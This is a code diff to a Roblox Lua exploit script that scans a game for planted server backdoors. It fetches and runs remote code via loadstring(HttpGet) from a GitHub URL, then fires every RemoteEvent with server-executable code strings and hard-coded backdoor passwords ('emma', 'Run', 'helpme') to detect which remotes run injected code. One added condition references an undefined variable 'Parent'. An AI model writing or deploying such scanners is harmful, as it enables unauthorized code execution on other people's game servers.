@@ -1,8 +1,13 @@
 
+local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
+local JointsService = game:GetService("JointsService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+
 local LocalPlayer = Players.LocalPlayer
+local Backpack = LocalPlayer.Backpack
 
 local Invisible = loadstring(game:HttpGet("https://raw.githubusercontent.com/0zBug/Invisible/main/main.lua"))()
 
@@ -11,7 +16,33 @@ local ValueName = "Thrix" .. Invisible.Encode(LocalPlayer.Name)
 function FindBackdoor()
     for _, Remote in pairs(game:GetDescendants()) do
         if Remote.ClassName == "RemoteEvent" then
-            Remote:FireServer(string.format("Value = Instance.new('StringValue', Workspace) Value.Name = '%s' Value.Value = '%s'", ValueName, Remote:GetFullName()))
+            if Remote.Parent then
+                if Remote.Parent == JointsService then 
+                    continue 
+                end
+
+                if Remote.Parent == ReplicatedStorage and Remote:FindFirstChild("__FUNCTION") or Remote.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage then 
+                    continue
+                end
+            end
+        
+            if Remote:IsDescendantOf(RobloxReplicatedStorage) then
+                continue
+            end
+
+            local ValueScript = string.format("Value = Instance.new('StringValue', Workspace) Value.Name = '%s' Value.Value = '%s'", ValueName, Remote:GetFullName())
+
+            if Remote.Name == "emma" and Remote.Parent and Remote.Parent.Name == "mynameemma" and Remote.Parent.Parent == ReplicatedStorage then
+                Remote:FireServer("pwojr8hoc0-gr0yxohlgp-0feb7ncxed", ",,,,,,,,,,,,,,,", ValueScript)
+            end
+
+            if Remote.Name == "Run" and Remote.Parent and Remote.Parent:FindFirstChild("Pages") and Remote.Parent:FindFirstChild("R6") and Remote.Parent:FindFirstChild("Version") and Remote.Parent:FindFirstChild("Title") then
+                Remote:FireServer("5#lGIERKWEF", ValueScript)
+            end
+
+            Remote:FireServer("helpme", ValueScript)
+            Remote:FireServer("cGlja2V0dA==", ValueScript)
+            Remote:FireServer(ValueScript)
         end
     end
 
